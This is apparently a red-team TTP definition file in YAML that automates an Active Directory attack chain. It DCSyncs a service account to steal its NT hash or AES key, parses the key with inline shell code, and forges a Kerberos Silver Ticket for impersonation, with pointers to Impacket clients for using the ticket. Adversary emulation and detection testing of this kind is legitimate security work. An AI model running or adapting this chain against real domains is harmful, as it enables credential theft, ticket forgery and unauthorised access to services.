---
api_version: 2.0
uuid: c4e8f2a1-7d5b-3c9e-a6f0-1b2d8e9c7f5a
name: DCSync Service Account and Forge Silver Ticket
authors:
  - isaac_fletcher
description: |
  This chain TTP performs an end-to-end Silver Ticket attack by first extracting a
  service account's hash via DCSync, then using it to forge a Silver Ticket for that
  service.

  The attack chain:
  1. Credential Access: DCSync the target service account to extract its NT hash
  2. Discovery: Look up the domain SID via lookupsid.py
  3. Credential Access: Forge a Silver Ticket using the extracted service account hash

  Note: This chain does not include a command execution step because silver tickets
  are service-specific — the forged ticket is only valid for the exact service and
  host matching the SPN. Use the forged ticket at /tmp/silver_ticket.ccache with the
  appropriate Impacket client for your target service (e.g., mssqlclient.py for MSSQL,
  smbclient.py for CIFS).
requirements:
  platforms:
    - os: linux
    - os: darwin
mitre:
  tactics:
    - TA0006 Credential Access
  techniques:
    - T1003 OS Credential Dumping
    - T1558 Steal or Forge Kerberos Tickets
  subtechniques:
    - T1003.006 DCSync
    - T1558.002 Silver Ticket
args:
  - name: domain
    description: The target Active Directory domain (e.g., contoso.com)
    default: contoso.local
  - name: dc
    description: The Domain Controller IP or hostname to target
    default: dc01.contoso.local
  - name: username
    description: Username for authentication (without domain prefix)
  - name: password
    description: Password for authentication
  - name: target_user
    description: The sAMAccountName of the service account to DCSync and forge a ticket for
  - name: service_spn
    description: The Service Principal Name to forge the ticket for (e.g., cifs/server.domain.com)
  - name: ticket_user
    description: The username to impersonate in the silver ticket
  - name: ticket_type
    description: |
      The type of key to use for forging the ticket.
      - rc4: Use the NT hash (default)
      - aes: Use the AES-256 key
    choices:
      - rc4
      - aes
    default: rc4
steps:
  - name: dcsync_service_account
    description: DCSync the target service account to extract its NT hash
    ttp: //credential-access/dcsync-user/ttp.yaml
    args:
      domain: "{{ .Args.domain }}"
      dc: "{{ .Args.dc }}"
      username: "{{ .Args.username }}"
      password: "{{ .Args.password }}"
      target_user: "{{ .Args.target_user }}"

  - name: extract_service_hash
    description: Parse the service account key from the DCSync output
    inline: |
      {{if eq .Args.ticket_type "aes"}}
      cat <<'DCSYNC_EOF' | grep -oP '(^|\\){{.Args.target_user}}:aes256-cts-hmac-sha1-96:\K[a-f0-9]+'
      {[{.StepVars.DCSYNC_OUTPUT}]}
      DCSYNC_EOF
      {{else}}
      cat <<'DCSYNC_EOF' | grep -oP '(^|\\){{.Args.target_user}}:\d+:[a-f0-9]+:\K[a-f0-9]+(?=:::)'
      {[{.StepVars.DCSYNC_OUTPUT}]}
      DCSYNC_EOF
      {{end}}
    outputvar: SERVICE_HASH

  - name: forge_silver_ticket
    description: Forge a Silver Ticket using the extracted service account hash
    ttp: //credential-access/forge-silver-ticket/ttp.yaml
    args:
      domain: "{{ .Args.domain }}"
      dc: "{{ .Args.dc }}"
      username: "{{ .Args.username }}"
      password: "{{ .Args.password }}"
      ticket_type: "{{ .Args.ticket_type }}"
      service_key: "{[{.StepVars.SERVICE_HASH}]}"
      service_spn: "{{ .Args.service_spn }}"
      ticket_user: "{{ .Args.ticket_user }}"
